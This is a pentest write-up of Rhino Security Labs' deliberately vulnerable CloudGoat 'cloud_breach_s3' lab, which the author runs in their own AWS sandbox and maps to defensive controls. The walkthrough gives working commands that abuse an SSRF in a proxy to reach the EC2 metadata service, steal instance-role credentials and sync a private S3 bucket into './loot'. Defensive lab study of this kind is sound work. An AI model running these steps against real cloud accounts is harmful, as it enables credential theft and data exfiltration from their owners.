# CloudGoat writeup: `cloud_breach_s3` (SSRF -> IMDS -> S3 exfiltration)

Hands-on AWS pentest of an intentionally-vulnerable lab (Rhino Security Labs'
[CloudGoat](https://github.com/RhinoSecurityLabs/cloudgoat)), run in my own sandbox
account. This is the attacker's view that motivates the preventive controls in this
repo: the IMDSv2 SCP, least-privilege IAM, S3 Block Public Access, and the
GuardDuty auto-response. Offense informs the controls.

## Scope and authorization
- **Target:** CloudGoat `cloud_breach_s3`, deployed by me into my own AWS sandbox.
- **Authorization:** my account, an intentionally-vulnerable lab. AWS's customer
  pentesting policy permits testing your own resources for in-scope services; no
  third party is touched.
- **Start:** black-box, unauthenticated. The only input is a public EC2 IP.
- **Objective:** reach the private cardholder-data S3 bucket.

## Summary
Chained an SSRF in an EC2 reverse proxy to the instance metadata service (IMDSv1),
stole the instance role's temporary credentials, and used them to enumerate and
exfiltrate a private S3 bucket. Time to objective ~15 minutes. Root causes: IMDSv1
enabled, an over-permissioned instance role, and an SSRF-able proxy.

## Walkthrough

**1. Recon.** The target is an EC2 running an nginx reverse proxy on port 80.
Probing shows it forwards upstream based on the `Host` header.

**2. SSRF -> IMDS.** Pivot the proxy to the link-local metadata endpoint and read
the instance role, then its temporary credentials:
```bash
curl -s http://<EC2_IP>/latest/meta-data/iam/security-credentials/ \
     -H "Host: 169.254.169.254"
# -> cg-banking-WAF-Role-cgid<random>

curl -s http://<EC2_IP>/latest/meta-data/iam/security-credentials/cg-banking-WAF-Role-cgid<random> \
     -H "Host: 169.254.169.254"
# -> { "AccessKeyId": "...", "SecretAccessKey": "...", "Token": "...", "Expiration": "..." }
```

**3. Assume the stolen identity.**
```bash
export AWS_ACCESS_KEY_ID=...  AWS_SECRET_ACCESS_KEY=...  AWS_SESSION_TOKEN=...
aws sts get-caller-identity      # confirms we now act as the instance role
```

**4. Enumerate and exfiltrate S3.**
```bash
aws s3 ls
aws s3 ls s3://cg-cardholder-data-bucket-cgid<random>
aws s3 sync s3://cg-cardholder-data-bucket-cgid<random> ./loot
# -> cardholder_data.csv
```
Objective met: private cardholder data exfiltrated starting from only a public IP.

## Impact
Full read of a private bucket containing (simulated) cardholder data, using
temporary credentials that look like legitimate instance activity. In a PCI or
other regulated environment this is a reportable breach.

## Root cause
- **IMDSv1 enabled:** SSRF can read credentials with a plain GET. IMDSv2 requires a
  PUT-issued session token first, which a basic SSRF cannot perform.
- **Over-permissioned instance role:** broad `s3:List*`/`s3:Get*` across buckets
  rather than one bucket.
- **SSRF in the proxy:** arbitrary upstream via the `Host` header.

## Remediation, mapped to this repo's controls

| Fix | Repo control | NIST CSF |
|---|---|---|
| Enforce IMDSv2 (`HttpTokens=required`) org-wide | `cloud/baseline` scp-004 RequireIMDSv2 | PR.PS |
| Least-privilege instance role (scope to one bucket) | `triage` flags broad IAM; `baseline` | PR.AA |
| S3 Block Public Access + bucket policy + default SSE | `baseline` scp-003 + Config S3 rules | PR.DS |
| Detect anomalous credential use, auto-contain | `detection/autoresponse` on GuardDuty `InstanceCredentialExfiltration` | DE.AE / RS.MI |
| Fix the SSRF before ship | `scanner` (SAST) + `appsec/dast` in CI | PR.PS |

## Framework mapping
- **MITRE ATT&CK:** T1552.005 (Cloud Instance Metadata API), T1078.004 (Valid
  Accounts: Cloud), T1530 (Data from Cloud Storage).
- **Repo threat model:** T06 (SSRF -> IMDS / privesc), T04 (exfiltration), T09 (S3
  exposure), T07 (leaked-credential use -> auto-response).

## Why this lives in the repo
`cloud_breach_s3` is the textbook case for "make the insecure state impossible"
(the IMDSv2 SCP) plus "detect the credential misuse" (GuardDuty auto-response). The
attack is the reason those controls exist; running it end to end is how I know they
are the right ones.
